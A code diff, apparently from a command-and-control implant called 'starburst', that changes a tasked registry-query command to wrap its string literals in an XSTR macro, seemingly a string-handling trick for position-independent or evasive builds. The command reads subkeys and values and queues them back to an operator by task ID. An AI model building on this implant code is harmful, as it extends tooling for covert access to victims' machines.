@@ -11,15 +11,15 @@ using namespace stardust;
 using namespace starburst;
 
 static auto declfn parse_hive( instance& inst, char* hive_str ) -> HKEY {
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKLM" ) ) ) == 0 ||
-         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_LOCAL_MACHINE" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKLM" ) ) == 0 ||
+         str_cmp( hive_str, XSTR( "HKEY_LOCAL_MACHINE" ) ) == 0 )
         return HKEY_LOCAL_MACHINE;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCU" ) ) ) == 0 ||
-         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_CURRENT_USER" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKCU" ) ) == 0 ||
+         str_cmp( hive_str, XSTR( "HKEY_CURRENT_USER" ) ) == 0 )
         return HKEY_CURRENT_USER;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCR" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKCR" ) ) == 0 )
         return HKEY_CLASSES_ROOT;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKU" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKU" ) ) == 0 )
         return HKEY_USERS;
     return nullptr;
 }
@@ -36,7 +36,7 @@ auto declfn starburst::cmd_reg_query(
 
     if ( !hive_str || hive_len == 0 || !subkey_str ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need hive and subkey" ) ) );
+            XSTR( "need hive and subkey" ) );
         return;
     }
 
@@ -49,7 +49,7 @@ auto declfn starburst::cmd_reg_query(
     HKEY hive = parse_hive( inst, hive_buf );
     if ( !hive ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid hive" ) ) );
+            XSTR( "invalid hive" ) );
         return;
     }
 
@@ -59,7 +59,7 @@ auto declfn starburst::cmd_reg_query(
 
     if ( status != ERROR_SUCCESS ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "RegOpenKeyExA failed" ) ) );
+            XSTR( "RegOpenKeyExA failed" ) );
         return;
     }
 
@@ -68,14 +68,14 @@ auto declfn starburst::cmd_reg_query(
     if ( !output ) {
         inst.advapi32.RegCloseKey( h_key );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     uint32_t out_offset = 0;
     uint32_t out_cap = 16384;
 
     // subkeys
-    str_copy( output + out_offset, symbol<char*>( const_cast<char*>( "Subkeys:\n" ) ) );
+    str_copy( output + out_offset, XSTR( "Subkeys:\n" ) );
     out_offset = str_len( output );
 
     char name_buf[256];
@@ -88,7 +88,7 @@ auto declfn starburst::cmd_reg_query(
         if ( status != ERROR_SUCCESS ) break;
 
         if ( out_offset + name_len + 4 < out_cap ) {
-            str_copy( output + out_offset, symbol<char*>( const_cast<char*>( "  " ) ) );
+            str_copy( output + out_offset, XSTR( "  " ) );
             out_offset += 2;
             memory::copy( output + out_offset, name_buf, name_len );
             out_offset += name_len;
@@ -98,7 +98,7 @@ auto declfn starburst::cmd_reg_query(
     }
 
     // values
-    str_copy( output + out_offset, symbol<char*>( const_cast<char*>( "Values:\n" ) ) );
+    str_copy( output + out_offset, XSTR( "Values:\n" ) );
     out_offset = str_len( output );
 
     for ( DWORD i = 0; ; i++ ) {
@@ -127,19 +127,19 @@ auto declfn starburst::cmd_reg_query(
         if ( status != ERROR_SUCCESS ) break;
 
         if ( out_offset + name_len + 64 < out_cap ) {
-            str_copy( output + out_offset, symbol<char*>( const_cast<char*>( "  " ) ) );
+            str_copy( output + out_offset, XSTR( "  " ) );
             out_offset += 2;
             memory::copy( output + out_offset, name_buf, name_len );
             out_offset += name_len;
 
             if ( val_type == REG_SZ || val_type == REG_EXPAND_SZ ) {
-                str_copy( output + out_offset, symbol<char*>( const_cast<char*>( " = " ) ) );
+                str_copy( output + out_offset, XSTR( " = " ) );
                 out_offset += 3;
                 uint32_t vlen = val_size < (out_cap - out_offset - 4) ? val_size : (out_cap - out_offset - 4);
                 memory::copy( output + out_offset, val_data, vlen );
                 out_offset += vlen;
             } else if ( val_type == REG_DWORD && val_size >= 4 ) {
-                str_copy( output + out_offset, symbol<char*>( const_cast<char*>( " = 0x" ) ) );
+                str_copy( output + out_offset, XSTR( " = 0x" ) );
                 out_offset += 5;
                 uint32_t dval = *reinterpret_cast<uint32_t*>( val_data );
                 char num[16];
@@ -148,7 +148,7 @@ auto declfn starburst::cmd_reg_query(
                 memory::copy( output + out_offset, num, nlen );
                 out_offset += nlen;
             } else {
-                str_copy( output + out_offset, symbol<char*>( const_cast<char*>( " (type=" ) ) );
+                str_copy( output + out_offset, XSTR( " (type=" ) );
                 out_offset += 7;
                 char tnum[8];
                 int_to_str( tnum, val_type, 10 );
